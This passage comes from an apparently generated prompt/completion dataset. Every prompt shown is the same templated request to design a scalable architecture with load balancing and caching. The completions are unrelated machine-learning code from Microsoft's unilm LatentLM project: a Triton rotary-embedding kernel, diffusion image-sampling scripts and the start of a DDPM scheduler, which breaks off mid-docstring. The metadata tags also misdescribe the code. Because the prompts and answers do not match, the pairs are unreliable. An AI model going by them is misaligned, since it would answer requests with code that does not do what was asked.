(rk_half[None, :] < rotary_dim_half))\r\n        tl.store(\r\n            OUT + rotary_dim_half * stride_out_headdim,\r\n            o1,\r\n            mask=(rm[:, None] < seqlen) & (rk_half[None, :] < rotary_dim_half),\r\n        )\r\n    else:\r\n        # We don't want to load X[0, 2, 4, ...] and X[1, 3, 5, ...] separately since both are slow.\r\n        # Instead, we load x0 = X[0, 1, 2, 3, ...] and x1 = X[1, 0, 3, 2, ...].\r\n        # Loading x0 will be fast but x1 will be slow.\r\n        # Then we load cos = COS[0, 0, 1, 1, ...] and sin = SIN[0, 0, 1, 1, ...].\r\n        # Then we do the calculation and use tl.where to pick put the right outputs for the even\r\n        # and for the odd indices.\r\n        rk_swap = rk + ((rk + 1) % 2) * 2 - 1  # 1, 0, 3, 2, 5, 4, ...\r\n        rk_repeat = tl.arange(0, BLOCK_K) // 2\r\n        X0 = X + (rm[:, None] * stride_x_seqlen + rk[None, :] * stride_x_headdim)\r\n        X1 = X + (rm[:, None] * stride_x_seqlen + rk_swap[None, :] * stride_x_headdim)\r\n        COS = COS + (rm_cs[:, None] * rotary_dim_half + rk_repeat[None, :])\r\n        SIN = SIN + (rm_cs[:, None] * rotary_dim_half + rk_repeat[None, :])\r\n        cos = tl.load(\r\n            COS,\r\n            mask=(rm_cs[:, None] < seqlen_ro) & (rk_repeat[None, :] < rotary_dim_half),\r\n            other=1.0,\r\n        ).to(tl.float32)\r\n        sin = tl.load(\r\n            SIN,\r\n            mask=(rm_cs[:, None] < seqlen_ro) & (rk_repeat[None, :] < rotary_dim_half),\r\n            other=0.0,\r\n        ).to(tl.float32)\r\n        x0 = tl.load(X0, mask=(rm[:, None] < seqlen) & (rk[None, :] < rotary_dim), other=0.0).to(\r\n            tl.float32\r\n        )\r\n        x1 = tl.load(\r\n            X1, mask=(rm[:, None] < seqlen) & (rk_swap[None, :] < rotary_dim), other=0.0\r\n        ).to(tl.float32)\r\n        if CONJUGATE:\r\n            sin = -sin\r\n        x0_cos = x0 * cos\r\n        x1_sin = x1 * sin\r\n        out = tl.where(rk[None, :] % 2 == 0, x0_cos - x1_sin, x0_cos + x1_sin)\r\n        OUT = OUT + (rm[:, None] * stride_out_seqlen + rk[None, :] * stride_out_headdim)\r\n        tl.store(OUT, out, mask=(rm[:, None] < seqlen) & (rk[None, :] < rotary_dim))\r\n\r\n\r\ndef apply_rotary(\r\n    x: torch.Tensor,\r\n    cos: torch.Tensor,\r\n    sin: torch.Tensor,\r\n    seqlen_offsets: Union[int, torch.Tensor] = 0,\r\n    cu_seqlens: Optional[torch.Tensor] = None,\r\n    max_seqlen: Optional[int] = None,\r\n    interleaved=False,\r\n    inplace=False,\r\n    conjugate=False,\r\n) -> torch.Tensor:\r\n    \"\"\"\r\n    Arguments:\r\n        x: (batch, seqlen, nheads, headdim) if cu_seqlens is None\r\n            else (total_seqlen, nheads, headdim).\r\n        cos: (seqlen_ro, rotary_dim / 2)\r\n        sin: (seqlen_ro, rotary_dim / 2)\r\n        seqlen_offsets: integer or integer tensor of size (batch,)\r\n        cu_seqlens: (batch + 1,) or None\r\n        max_seqlen: int\r\n    Returns:\r\n        y: (batch, seqlen, nheads, headdim)\r\n    \"\"\"\r\n    is_varlen = cu_seqlens is not None\r\n    if not is_varlen:\r\n        batch, seqlen, nheads, headdim = x.shape\r\n    else:\r\n        assert max_seqlen is not None, \"If cu_seqlens is passed in, then max_seqlen must be passed\"\r\n        total_seqlen, nheads, headdim = x.shape\r\n        batch_p_1 = cu_seqlens.shape[0]\r\n        batch = batch_p_1 - 1\r\n        seqlen = max_seqlen\r\n    seqlen_ro, rotary_dim = cos.shape\r\n    assert sin.shape == cos.shape\r\n    rotary_dim *= 2\r\n    assert rotary_dim <= headdim, \"rotary_dim must be <= headdim\"\r\n    assert headdim <= 256, \"Only support headdim <= 256\"\r\n    assert seqlen_ro >= seqlen, \"seqlen_ro must be >= seqlen\"\r\n\r\n    assert (\r\n        cos.dtype == sin.dtype\r\n    ), f\"cos and sin must have the same dtype, got {cos.dtype} and {sin.dtype}\"\r\n    assert (\r\n        x.dtype == cos.dtype\r\n    ), f\"Input and cos/sin must have the same dtype, got {x.dtype} and {cos.dtype}\"\r\n\r\n    cos, sin = cos.contiguous(), sin.contiguous()\r\n    if isinstance(seqlen_offsets, torch.Tensor):\r\n        assert seqlen_offsets.shape == (batch,)\r\n        assert seqlen_offsets.dtype in [torch.int32, torch.int64]\r\n        seqlen_offsets = seqlen_offsets.contiguous()\r\n    else:\r\n        assert seqlen_offsets + seqlen <= seqlen_ro\r\n\r\n    output = torch.empty_like(x) if not inplace else x\r\n    if rotary_dim < headdim and not inplace:\r\n        output[..., rotary_dim:].copy_(x[..., rotary_dim:])\r\n\r\n    BLOCK_K = (\r\n        32\r\n        if rotary_dim <= 32\r\n        else (64 if rotary_dim <= 64 else (128 if rotary_dim <= 128 else 256))\r\n    )\r\n    grid = lambda META: (triton.cdiv(seqlen, META[\"BLOCK_M\"]), batch, nheads)  # noqa\r\n    BLOCK_M = 4 if interleaved else (8 if rotary_dim <= 64 else 4)\r\n\r\n    # Need this, otherwise Triton tries to launch from cuda:0 and we get\r\n    # ValueError: Pointer argument (at 0) cannot be accessed from Triton (cpu tensor?)\r\n    with torch.cuda.device(x.device.index):\r\n        rotary_kernel[grid](\r\n            output,  # data ptrs\r\n            x,\r\n            cos,\r\n            sin,\r\n            cu_seqlens,\r\n            seqlen_offsets,\r\n            seqlen,  # shapes\r\n            nheads,\r\n            rotary_dim,\r\n            seqlen_ro,\r\n            seqlen // 128,  # key for triton cache (limit number of compilations)\r\n            output.stride(0) if not is_varlen else 0,  # batch_strides if not varlen else 0\r\n            output.stride(-3),  # seqlen_stride or total_seqlen_stride\r\n            output.stride(-2),  # nheads_stride\r\n            output.stride(-1),  # headdim_stride\r\n            x.stride(0) if not is_varlen else 0,  # batch_strides if not varlen else 0\r\n            x.stride(-3),  # seqlen stride or total_seqlen_stride\r\n            x.stride(-2),  # nheads stride\r\n            x.stride(-1),  # headdim stride\r\n            BLOCK_K,\r\n            isinstance(seqlen_offsets, torch.Tensor),\r\n            is_varlen,\r\n            interleaved,\r\n            conjugate,\r\n            BLOCK_M,\r\n        )\r\n    return output\r\n\r\nclass ApplyRotaryEmb(torch.autograd.Function):\r\n    @staticmethod\r\n    def forward(\r\n        ctx,\r\n        x,\r\n        cos,\r\n        sin,\r\n        interleaved=False,\r\n        inplace=False,\r\n        seqlen_offsets: Union[int, torch.Tensor] = 0,\r\n        cu_seqlens: Optional[torch.Tensor] = None,\r\n        max_seqlen: Optional[int] = None,\r\n    ):\r\n        out = apply_rotary(\r\n            x,\r\n            cos,\r\n            sin,\r\n            seqlen_offsets=seqlen_offsets,\r\n            cu_seqlens=cu_seqlens,\r\n            max_seqlen=max_seqlen,\r\n            interleaved=interleaved,\r\n            inplace=inplace,\r\n        )\r\n        if isinstance(seqlen_offsets, int):\r\n            # Can't save int with save_for_backward\r\n            ctx.save_for_backward(cos, sin, cu_seqlens)\r\n            ctx.seqlen_offsets = seqlen_offsets\r\n        else:\r\n            ctx.save_for_backward(cos, sin, cu_seqlens, seqlen_offsets)\r\n            ctx.seqlen_offsets = None\r\n        ctx.interleaved = interleaved\r\n        ctx.inplace = inplace\r\n        ctx.max_seqlen = max_seqlen\r\n        return out if not inplace else x\r\n\r\n    @staticmethod\r\n    def backward(ctx, do):\r\n        seqlen_offsets = ctx.seqlen_offsets\r\n        if seqlen_offsets is None:\r\n            cos, sin, cu_seqlens, seqlen_offsets = ctx.saved_tensors\r\n        else:\r\n            cos, sin, cu_seqlens = ctx.saved_tensors\r\n        # TD [2023-09-02]: For some reason Triton (2.0.0.post1) errors with\r\n        # \"[CUDA]: invalid device context\", and cloning makes it work. Idk why. Triton 2.1.0 works.\r\n        if not ctx.interleaved and not ctx.inplace:\r\n            do = do.clone()\r\n        dx = apply_rotary(\r\n            do,\r\n            cos,\r\n            sin,\r\n            seqlen_offsets=seqlen_offsets,\r\n            cu_seqlens=cu_seqlens,\r\n            max_seqlen=ctx.max_seqlen,\r\n            interleaved=ctx.interleaved,\r\n            inplace=ctx.inplace,\r\n            conjugate=True,\r\n        )\r\n        return dx, None, None, None, None, None, None, None\r\n\r\n\r\ndef apply_rotary_emb(\r\n    x,\r\n    cos,\r\n    sin,\r\n    interleaved=False,\r\n    inplace=False,\r\n    seqlen_offsets: Union[int, torch.Tensor] = 0,\r\n    cu_seqlens: Optional[torch.Tensor] = None,\r\n    max_seqlen: Optional[int] = None,\r\n):\r\n    \"\"\"\r\n    Arguments:\r\n        x: (batch_size, seqlen, nheads, headdim) if cu_seqlens is None\r\n            else (total_seqlen, nheads, headdim)\r\n        cos, sin: (seqlen_rotary, rotary_dim / 2)\r\n        interleaved: if True, rotate pairs of even and odd dimensions (GPT-J style) instead\r\n            of 1st half and 2nd half (GPT-NeoX style).\r\n        inplace: if True, apply rotary embedding in-place.\r\n        seqlen_offsets: (batch_size,) or int. Each sequence in x is shifted by this amount.\r\n            Most commonly used in inference when we have KV cache.\r\n        cu_seqlens: (batch + 1,) or None\r\n        max_seqlen: int\r\n    Return:\r\n        out: (batch_size, seqlen, nheads, headdim) if cu_seqlens is None\r\n            else (total_seqlen, nheads, headdim)\r\n    rotary_dim must be <= headdim\r\n    Apply rotary embedding to the first rotary_dim of x.\r\n    \"\"\"\r\n    return ApplyRotaryEmb.apply(\r\n        x, cos, sin, interleaved, inplace, seqlen_offsets, cu_seqlens, max_seqlen\r\n    )\r\n\r\ndef rotate_every_two(x):\r\n    x1 = x[:, :, :, ::2]\r\n    x2 = x[:, :, :, 1::2]\r\n    x = torch.stack((-x2, x1), dim=-1)\r\n    return x.flatten(-2)\r\n\r\ndef apply_rotary_pos_emb(x, cos, sin, interleaved=False):\r\n    cos, sin = map(lambda t: torch.repeat_interleave(t, 2, dim=-1).unsqueeze(1), (cos, sin))\r\n    return (x * cos) + (rotate_every_two(x) * sin)", "metadata": {"source": "github.com/microsoft/unilm", "file_path": "LatentLM/models/kernel/rotary.py", "language": "python", "complexity": "complex", "star_count": 21572, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 342}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import argparse\r\nimport os\r\nfrom tqdm import tqdm\r\n\r\nimport torch\r\nimport torch.nn.functional as F\r\nfrom torchvision.utils import save_image\r\nfrom accelerate.utils import set_seed\r\n\r\nfrom safetensors.torch import load_file \r\nfrom tokenizer_models import AutoencoderKL, load_vae\r\n\r\nfrom schedule.dpm_solver import DPMSolverMultistepScheduler\r\nfrom models import All_models\r\n\r\n\r\ndef parse_args():\r\n    parser = argparse.ArgumentParser(description=\"Simple example of a training script.\")\r\n    parser.add_argument(\r\n        \"--seed\",\r\n        type=int,\r\n        default=0,\r\n        help=\"A seed to use for the random number generator. Can be negative to not set a seed.\",\r\n    )\r\n    parser.add_argument(\r\n        \"--model\",\r\n        type=str,\r\n        default=\"Transformer-L\",\r\n        help=\"The config of the UNet model to train, leave as None to use standard DDPM configuration.\",\r\n    )\r\n    parser.add_argument(\r\n        \"--vae\",\r\n        type=str,\r\n        default=None,\r\n    )\r\n    parser.add_argument(\r\n        \"--train_data_dir\",\r\n        type=str,\r\n        default=\"/tmp/ILSVRC/Data/CLS-LOC/train\",\r\n        help=(\r\n            \"A folder containing the training data. Folder contents must follow the structure described in\"\r\n            \" https://huggingface.co/docs/datasets/image_dataset#imagefolder. In particular, a `metadata.jsonl` file\"\r\n            \" must exist to provide the captions for the images. Ignored if `dataset_name` is specified.\"\r\n        ),\r\n    )\r\n    parser.add_argument(\r\n        \"--image_size\",\r\n        type=int,\r\n        default=256,\r\n        help=(\r\n            \"The image_size for input images, all the images in the train/validation dataset will be resized to this\"\r\n            \" image_size\"\r\n        ),\r\n    )\r\n    parser.add_argument(\"--num-classes\", type=int, default=1000)\r\n    parser.add_argument(\r\n        \"--mixed_precision\",\r\n        type=str,\r\n        default=\"no\",\r\n        choices=[\"no\", \"fp16\", \"bf16\"],\r\n        help=(\r\n            \"Whether to use mixed precision. Choose\"\r\n            \"between fp16 and bf16 (bfloat16). Bf16 requires PyTorch >= 1.10.\"\r\n            \"and an Nvidia Ampere GPU.\"\r\n        ),\r\n    )\r\n    parser.add_argument(\r\n        \"--prediction_type\",\r\n        type=str,\r\n        default=\"epsilon\",\r\n        help=\"Whether the model should predict the 'epsilon'/noise error or directly the reconstructed image 'x0'.\",\r\n    )\r\n    parser.add_argument(\"--use_ema\", action=\"store_true\", help=\"Whether to use Exponential Moving Average for the final model weights.\")  \r\n    parser.add_argument(\"--ddpm_num_steps\", type=int, default=1000)\r\n    parser.add_argument(\"--ddpm_num_inference_steps\", type=int, default=250)\r\n    parser.add_argument(\"--ddpm_beta_schedule\", type=str, default=\"cosine\", help=\"The beta schedule to use for DDPM.\") \r\n    parser.add_argument(\"--cfg-scale\", type=float, default=4.0)\r\n    parser.add_argument(\r\n        \"--checkpoint\",\r\n        type=str,\r\n        default=None,\r\n        help=(\r\n            \"Whether training should be resumed from a previous checkpoint. Use a path saved by\"\r\n            ' `--checkpointing_steps`, or `\"latest\"` to automatically select the last available checkpoint.'\r\n        ),\r\n    )\r\n    parser.add_argument(\"--image_name\", type=str, default=\"sample.png\")\r\n    args = parser.parse_args()\r\n    return args\r\n\r\n@torch.no_grad()\r\ndef main(args):\r\n    set_seed(args.seed)\r\n    device = \"cuda\" if torch.cuda.is_available() else \"cpu\"\r\n    if args.mixed_precision == \"bf16\":\r\n        dtype = torch.bfloat16\r\n    elif args.mixed_precision == \"fp16\":\r\n        dtype = torch.float16\r\n    else:\r\n        dtype = torch.float32\r\n    # Create model:\r\n    vae, input_size, latent_size, flatten_input = load_vae(args.vae, args.image_size)\r\n        \r\n    model = All_models[args.model](\r\n        input_size=input_size,\r\n        in_channels=latent_size,\r\n        num_classes=args.num_classes,\r\n        flatten_input=flatten_input,\r\n    ).to(device).to(dtype)\r\n    # Initialize the scheduler\r\n    noise_scheduler = DPMSolverMultistepScheduler(num_train_timesteps=args.ddpm_num_steps, beta_schedule=args.ddpm_beta_schedule, prediction_type=args.prediction_type)\r\n\r\n    model.eval()\r\n    vae.eval()\r\n    # Potentially load in the weights and states from a previous save\r\n    if args.checkpoint:\r\n        other_state = torch.load(os.path.join(args.checkpoint, \"other_state.pth\"))\r\n        scaling_factor = other_state[\"scaling_factor\"]\r\n        bias_factor = other_state[\"bias_factor\"]\r\n        print(f\"Scaling factor: {scaling_factor}, Bias factor: {bias_factor}\")\r\n        if args.use_ema and other_state[\"ema\"] is not None:\r\n            checkpoint = other_state[\"ema\"][\"shadow_params\"]\r\n            for model_param, ema_param in zip(model.parameters(), checkpoint):\r\n                model_param.data = ema_param.data.to(device).to(dtype)\r\n            print(f\"Loaded model from checkpoint {args.checkpoint}, EMA applied.\")\r\n        else:\r\n            if os.path.exists(os.path.join(args.checkpoint, \"model.safetensors\")):\r\n                checkpoint = load_file(os.path.join(args.checkpoint, \"model.safetensors\"))\r\n            elif os.path.exists(os.path.join(args.checkpoint, \"pytorch_model\")):\r\n                checkpoint = torch.load(os.path.join(args.checkpoint, \"pytorch_model\", \"mp_rank_00_model_states.pt\"))[\"module\"]\r\n            else:\r\n                raise ValueError(f\"Could not find model checkpoint in {args.checkpoint}.\")\r\n            \r\n            model.load_state_dict(checkpoint)\r\n            print(f\"Loaded model from checkpoint {args.checkpoint}.\")\r\n\r\n    # Labels to condition the model with (feel free to change):\r\n    class_labels = [281, 282, 283, 284, 285, 4, 7, 963]\r\n    # class_labels = [207, 360, 387, 974, 88, 979, 417, 279]\r\n    def p_sample(model, image):\r\n        noise_scheduler.set_timesteps(args.ddpm_num_inference_steps)\r\n        for t in noise_scheduler.timesteps:\r\n            model_output = model(image, t.repeat(image.shape[0]).to(image))\r\n            image = noise_scheduler.step(model_output, t, image).prev_sample\r\n        return image\r\n\r\n    # Create sampling noise:\r\n    n = len(class_labels)\r\n    y = torch.tensor(class_labels, device=device)\r\n    # Setup classifier-free guidance:\r\n    y_null = torch.tensor([1000] * n, device=device)\r\n    y = torch.cat([y, y_null], 0)\r\n    # Sample images:\r\n    samples = model.sample_with_cfg(y, args.cfg_scale, p_sample)\r\n    images = vae.decode(samples / scaling_factor - bias_factor)\r\n\r\n    # Save and display images:\r\n    save_image(images, f\"visuals/{args.image_name}\", nrow=4, normalize=True, value_range=(-1, 1))\r\n    print(f\"Saved image to visuals/{args.image_name}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    args = parse_args()\r\n    main(args)", "metadata": {"source": "github.com/microsoft/unilm", "file_path": "LatentLM/sample_hf.py", "language": "python", "complexity": "medium", "star_count": 21572, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 164}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import argparse\r\nimport os\r\nfrom tqdm import tqdm\r\nimport random\r\n\r\nimport torch\r\nimport torch.nn.functional as F\r\nfrom torchvision.utils import save_image\r\nfrom accelerate.utils import set_seed\r\n\r\nfrom timm.models import create_model\r\nfrom safetensors.torch import load_file \r\nfrom tokenizer_models import AutoencoderKL, load_vae\r\n\r\nfrom schedule.dpm_solver import DPMSolverMultistepScheduler\r\nfrom models import All_models\r\n\r\nimagenet_indices = [\r\n    1, 10, 84, 94, 97, 98, 100, 104, 107, 117, 151, 157, 161, 178, 182, 183,\r\n    268, 322, 337, 354, 366, 380, 973, 975, 978, 980, 981, 983, 985, 986, 991,\r\n    995, 996, 998, 999, 409, 453, 483, 497, 555, 648, 651, 690, 700, 701, 714,\r\n    759, 762, 765, 780, 859, 861, 928, 929, 963\r\n]\r\n\r\ndef parse_args():\r\n    parser = argparse.ArgumentParser(description=\"Simple example of a training script.\")\r\n    parser.add_argument(\r\n        \"--seed\",\r\n        type=int,\r\n        default=0,\r\n        help=\"A seed to use for the random number generator. Can be negative to not set a seed.\",\r\n    )\r\n    parser.add_argument(\r\n        \"--model\",\r\n        type=str,\r\n        default=\"Transformer-L\",\r\n        help=\"The config of the UNet model to train, leave as None to use standard DDPM configuration.\",\r\n    )\r\n    parser.add_argument(\r\n        \"--vae\",\r\n        type=str,\r\n        default=None,\r\n    )\r\n    parser.add_argument(\r\n        \"--train_data_dir\",\r\n        type=str,\r\n        default=\"/tmp/ILSVRC/Data/CLS-LOC/train\",\r\n        help=(\r\n            \"A folder containing the training data. Folder contents must follow the structure described in\"\r\n            \" https://huggingface.co/docs/datasets/image_dataset#imagefolder. In particular, a `metadata.jsonl` file\"\r\n            \" must exist to provide the captions for the images. Ignored if `dataset_name` is specified.\"\r\n        ),\r\n    )\r\n    parser.add_argument(\r\n        \"--image_size\",\r\n        type=int,\r\n        default=256,\r\n        help=(\r\n            \"The image_size for input images, all the images in the train/validation dataset will be resized to this\"\r\n            \" image_size\"\r\n        ),\r\n    )\r\n    parser.add_argument(\"--num-classes\", type=int, default=1000)\r\n    parser.add_argument(\r\n        \"--mixed_precision\",\r\n        type=str,\r\n        default=\"no\",\r\n        choices=[\"no\", \"fp16\", \"bf16\"],\r\n        help=(\r\n            \"Whether to use mixed precision. Choose\"\r\n            \"between fp16 and bf16 (bfloat16). Bf16 requires PyTorch >= 1.10.\"\r\n            \"and an Nvidia Ampere GPU.\"\r\n        ),\r\n    )\r\n    parser.add_argument(\r\n        \"--prediction_type\",\r\n        type=str,\r\n        default=\"epsilon\",\r\n        help=\"Whether the model should predict the 'epsilon'/noise error or directly the reconstructed image 'x0'.\",\r\n    )\r\n    parser.add_argument(\"--use_ema\", action=\"store_true\", help=\"Whether to use Exponential Moving Average for the final model weights.\")  \r\n    parser.add_argument(\"--ddpm_num_steps\", type=int, default=1000)\r\n    parser.add_argument(\"--ddpm_num_inference_steps\", type=int, default=250)\r\n    parser.add_argument(\"--ddpm_beta_schedule\", type=str, default=\"cosine\", help=\"The beta schedule to use for DDPM.\") \r\n    parser.add_argument(\"--cfg-scale\", type=float, default=4.0)\r\n    parser.add_argument(\r\n        \"--checkpoint\",\r\n        type=str,\r\n        default=None,\r\n        help=(\r\n            \"Whether training should be resumed from a previous checkpoint. Use a path saved by\"\r\n            ' `--checkpointing_steps`, or `\"latest\"` to automatically select the last available checkpoint.'\r\n        ),\r\n    )\r\n    parser.add_argument(\r\n        \"--batch_size\", type=int, default=32, help=\"Batch size (per device) for the training dataloader.\"\r\n    )\r\n    args = parser.parse_args()\r\n    return args\r\n\r\n@torch.no_grad()\r\ndef main(args):\r\n    set_seed(args.seed)\r\n    device = \"cuda\" if torch.cuda.is_available() else \"cpu\"\r\n    if args.mixed_precision == \"bf16\":\r\n        dtype = torch.bfloat16\r\n    elif args.mixed_precision == \"fp16\":\r\n        dtype = torch.float16\r\n    else:\r\n        dtype = torch.float32\r\n    vae, input_size, latent_size, flatten_input = load_vae(args.vae, args.image_size)\r\n        \r\n    model = All_models[args.model](\r\n        input_size=input_size,\r\n        in_channels=latent_size,\r\n        num_classes=args.num_classes,\r\n        flatten_input=flatten_input,\r\n    ).to(device).to(dtype)\r\n    # Initialize the scheduler\r\n    noise_scheduler = DPMSolverMultistepScheduler(num_train_timesteps=args.ddpm_num_steps, beta_schedule=args.ddpm_beta_schedule, prediction_type=args.prediction_type)\r\n\r\n    model.eval()\r\n    vae.eval()\r\n    # Potentially load in the weights and states from a previous save\r\n    if args.checkpoint:\r\n        other_state = torch.load(os.path.join(args.checkpoint, \"other_state.pth\"))\r\n        scaling_factor = other_state[\"scaling_factor\"]\r\n        bias_factor = other_state[\"bias_factor\"]\r\n        print(f\"Scaling factor: {scaling_factor}, Bias factor: {bias_factor}\")\r\n        if args.use_ema and other_state[\"ema\"] is not None:\r\n            checkpoint = other_state[\"ema\"][\"shadow_params\"]\r\n            for model_param, ema_param in zip(model.parameters(), checkpoint):\r\n                model_param.data = ema_param.data.to(device).to(dtype)\r\n            print(f\"Loaded model from checkpoint {args.checkpoint}, EMA applied.\")\r\n        else:\r\n            if os.path.exists(os.path.join(args.checkpoint, \"model.safetensors\")):\r\n                checkpoint = load_file(os.path.join(args.checkpoint, \"model.safetensors\"))\r\n            elif os.path.exists(os.path.join(args.checkpoint, \"pytorch_model\")):\r\n                checkpoint = torch.load(os.path.join(args.checkpoint, \"pytorch_model\", \"mp_rank_00_model_states.pt\"))[\"module\"]\r\n            else:\r\n                raise ValueError(f\"Could not find model checkpoint in {args.checkpoint}.\")\r\n            \r\n            model.load_state_dict(checkpoint)\r\n            print(f\"Loaded model from checkpoint {args.checkpoint}.\")\r\n\r\n    image_id = 0\r\n    for _ in tqdm(range(5)):\r\n        def p_sample(model, image):\r\n            noise_scheduler.set_timesteps(args.ddpm_num_inference_steps)\r\n            for t in noise_scheduler.timesteps:\r\n                model_output = model(image, t.repeat(image.shape[0]).to(image))\r\n                image = noise_scheduler.step(model_output, t, image).prev_sample\r\n            return image\r\n\r\n        # Create sampling noise:\r\n        n = args.batch_size\r\n        y = torch.randint(0, args.num_classes, (n,), device=device)\r\n        # y = torch.tensor(random.choices([281, 282, 283, 284, 285, 4, 7, 963], k=n), device=device)\r\n        # Setup classifier-free guidance:\r\n        y_null = torch.tensor([1000] * n, device=device)\r\n        y = torch.cat([y, y_null], 0)\r\n        # Sample images:\r\n        samples = model.sample_with_cfg(y, args.cfg_scale, p_sample)\r\n        images = vae.decode(samples / scaling_factor - bias_factor)\r\n\r\n        # Save image one by one\r\n        for i, image in enumerate(images):\r\n            save_image(image, f\"demo/{image_id}.png\", normalize=True, value_range=(-1, 1))\r\n            image_id += 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    args = parse_args()\r\n    main(args)", "metadata": {"source": "github.com/microsoft/unilm", "file_path": "LatentLM/sample_many.py", "language": "python", "complexity": "medium", "star_count": 21572, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 174}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2024 UC Berkeley Team and The HuggingFace Team. All rights reserved.\r\n#\r\n# Licensed under the Apache License, Version 2.0 (the \"License\");\r\n# you may not use this file except in compliance with the License.\r\n# You may obtain a copy of the License at\r\n#\r\n#     http://www.apache.org/licenses/LICENSE-2.0\r\n#\r\n# Unless required by applicable law or agreed to in writing, software\r\n# distributed under the License is distributed on an \"AS IS\" BASIS,\r\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\n# See the License for the specific language governing permissions and\r\n# limitations under the License.\r\n\r\n# DISCLAIMER: This file is strongly influenced by https://github.com/ermongroup/ddim\r\n\r\nimport math\r\nfrom dataclasses import dataclass\r\nfrom typing import List, Optional, Tuple, Union\r\n\r\nimport numpy as np\r\nimport torch\r\n\r\nfrom diffusers.configuration_utils import ConfigMixin, register_to_config\r\nfrom diffusers.utils import BaseOutput\r\nfrom diffusers.utils.torch_utils import randn_tensor\r\nfrom diffusers.schedulers.scheduling_utils import KarrasDiffusionSchedulers, SchedulerMixin\r\n\r\n\r\n@dataclass\r\nclass DDPMSchedulerOutput(BaseOutput):\r\n    \"\"\"\r\n    Output class for the scheduler's `step` function output.\r\n\r\n    Args:\r\n        prev_sample (`torch.Tensor` of shape `(batch_size, num_channels, height, width)` for images):\r\n            Computed sample `(x_{t-1})` of previous timestep. `prev_sample` should be used as next model input in the\r\n            denoising loop.\r\n        pred_original_sample (`torch.Tensor` of shape `(batch_size, num_channels, height, width)` for images):\r\n            The predicted denoised sample `(x_{0})` based on the model output from the current timestep.\r\n            `pred_original_sample` can be used to preview progress or for guidance.\r\n    \"\"\"\r\n\r\n    prev_sample: torch.Tensor\r\n    pred_original_sample: Optional[torch.Tensor] = None\r\n\r\n\r\ndef betas_for_alpha_bar(\r\n    num_diffusion_timesteps,\r\n    max_beta=0.999,\r\n    alpha_transform_type=\"cosine\",\r\n):\r\n    \"\"\"\r\n    Create a beta schedule that discretizes the given alpha_t_bar function, which defines the cumulative product of\r\n    (1-beta) over time from t = [0,1].\r\n\r\n    Contains a function alpha_bar that takes an argument t and transforms it to the cumulative product of (1-beta) up\r\n    to that part of the diffusion process.\r\n\r\n\r\n    Args:\r\n        num_diffusion_timesteps (`int`): the number of betas to produce.\r\n        max_beta (`float`): the maximum beta to use; use values lower than 1 to\r\n                     prevent singularities.\r\n        alpha_transform_type (`str`, *optional*, default to `cosine`): the type of noise schedule for alpha_bar.\r\n                     Choose from `cosine` or `exp`\r\n\r\n    Returns:\r\n        betas (`np.ndarray`): the betas used by the scheduler to step the model outputs\r\n    \"\"\"\r\n    if alpha_transform_type == \"cosine\":\r\n\r\n        def alpha_bar_fn(t):\r\n            return math.cos((t + 0.008) / 1.008 * math.pi / 2) ** 2\r\n            # return math.cos(t * math.pi / 2 * 0.95) ** 2\r\n\r\n    elif alpha_transform_type == \"exp\":\r\n\r\n        def alpha_bar_fn(t):\r\n            return math.exp(t * -12.0)\r\n\r\n    elif alpha_transform_type == \"cauchy\":\r\n        # µ + γ tan (π (0.5 - x))  γ = 1, µ = 3\r\n        # alpha^2 = 1-1/(exp(λ)+1)\r\n        def alpha_bar_fn(t, gamma=1, mu=3):\r\n            snr = mu + gamma * math.tan(math.pi * (0.5 - t) * 0.9)\r\n            return 1 - 1 / (math.exp(snr) + 1.1)\r\n\r\n    elif alpha_transform_type == \"laplace\":\r\n        # µ − bsgn(0.5 − t) log(1 − 2|t − 0.5|) µ = 0, b = 1\r\n        def alpha_bar_fn(t, mu=0, b=1):\r\n            snr = mu - b * math.copysign(1, 0.5 - t) * math.log(1 - 2 * abs(t - 0.5) * 0.98)\r\n            return 1 - 1 / (math.exp(snr) + 1.02)\r\n\r\n    else:\r\n        raise ValueError(f\"Unsupported alpha_transform_type: {alpha_transform_type}\")\r\n\r\n    betas = []\r\n    for i in range(num_diffusion_timesteps):\r\n        t1 = i / num_diffusion_timesteps\r\n        t2 = (i + 1) / num_diffusion_timesteps\r\n        betas.append(min(1 - alpha_bar_fn(t2) / alpha_bar_fn(t1), max_beta))\r\n    return torch.tensor(betas, dtype=torch.float32)\r\n\r\n\r\n# Copied from diffusers.schedulers.scheduling_ddim.rescale_zero_terminal_snr\r\ndef rescale_zero_terminal_snr(betas):\r\n    \"\"\"\r\n    Rescales betas to have zero terminal SNR Based on https://arxiv.org/pdf/2305.08891.pdf (Algorithm 1)\r\n\r\n\r\n    Args:\r\n        betas (`torch.Tensor`):\r\n            the betas that the scheduler is 